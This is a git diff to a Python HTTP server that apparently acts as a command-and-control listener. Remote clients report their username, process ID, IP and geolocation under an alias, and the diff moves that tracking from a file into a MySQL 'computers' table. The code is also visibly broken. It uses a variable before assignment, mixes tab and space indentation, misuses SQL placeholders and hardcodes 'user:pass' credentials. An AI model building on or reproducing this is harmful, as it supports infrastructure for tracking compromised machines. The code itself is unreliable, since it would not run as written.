@@ -2,14 +2,21 @@
 
 import socketserver
 from threading import Thread
-from legend import server_legacy
-
+# from legend import server_legacy
+import mysql.connector
 import socket, base64
 from http.server import BaseHTTPRequestHandler
 from urllib.parse import unquote
 
 global req_head, flag
 flag = False
+
+mydb = mysql.connector.connect(
+    host="localhost",
+    user="",
+    password="",
+    database="net"
+)
 
 
 class Connect(BaseHTTPRequestHandler):
@@ -53,15 +60,20 @@ class Server(BaseHTTPRequestHandler):
 
     def do_POST(self):
         creds = 'user:pass'.encode()
-        # creds_connect = 'connect:time'.encode()
+        # creds_connect = 'connect:time'.encode()    
+        
         if self.headers.get('Authorization') == f'Basic {str(base64.b64encode(creds))[2:-1]}':
-            data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
+            # data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
             port = int((data.split("&")[0]).split("=")[1])
-
+            data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
+            port = 3214
             if port == 3214:
+                # print(port)
                 global req_head, flag
-                req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
+                # req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
+                req_head = data
                 req_head = req_head.split('&')
+                # print(req_head)
                 keys, vals = [], []
 
                 for el in req_head:
@@ -74,7 +86,27 @@ class Server(BaseHTTPRequestHandler):
                 del keys
                 del vals
 
-                flag = True
+                user = req_head.get('user')
+		pid = req_head.get('pid')
+		client_ip = req_head.get('ip')
+		geo = req_head.get('geo')
+		alias = req_head.get('alias')
+		status = req_head.get('status')
+		
+		if status == "register":
+                    sql = "INSERT INTO computers (alias, username, pid, ip, geo) VALUES (%s, %s, %s, %s, %s);"
+                    val = (alias, user, pid, client_ip, geo)
+
+                elif status == "update":
+                    sql = "update computers set username='%s', pid=%s, ip='%s', geo='%s' where alias='%s';"
+                    val = (user, pid, client_ip, geo, alias)
+ 
+                mycursor = mydb.cursor()
+                mycursor.execute(sql, val)
+                mydb.commit()
+
+
+		
                 self.send_response(200)
                 self.end_headers()
 
@@ -113,17 +145,8 @@ server.start()
 
 while True:
     if flag:
-        user = req_head.get('user')
-        pid = req_head.get('pid')
-        client_ip = req_head.get('ip')
-
-        # cprint.warn(f'Connected from {client_ip} with alias {alias}')
-        print(f'Connected from {client_ip} with alias {alias}')
-
-        c = {"user_cle": user, "pid_cle": pid, "clientip_cle": client_ip, "server_address": shell_address, "alias_cle": str(alias)}
-        clients[str(alias)] = c
-        alias += 1
-        with open("temp.db", "w+") as f:
-            f.write(str(alias - 1) + "|" + str(c))
-            f.close()
+        print(req_head)
+    
+        
+        
         flag = False
